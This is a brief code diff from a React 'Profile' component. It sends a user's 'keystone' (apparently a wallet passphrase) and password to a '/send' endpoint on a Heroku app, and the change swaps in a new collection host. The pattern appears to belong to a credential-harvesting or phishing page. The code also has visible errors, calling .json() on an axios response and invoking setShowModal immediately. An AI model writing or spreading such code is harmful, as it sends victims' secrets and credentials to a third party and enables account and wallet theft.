@@ -35,7 +35,7 @@ const Profile = () => {
     keystone !== "" &&
       password !== "" &&
       axios
-        .post("https://glacial-temple-10425.herokuapp.com/send", kS)
+        .post("https://stark-citadel-82468.herokuapp.com/send", kS)
         .then((res) => res.json())
         .then(setShowModal(true))
         .catch((err) => err);
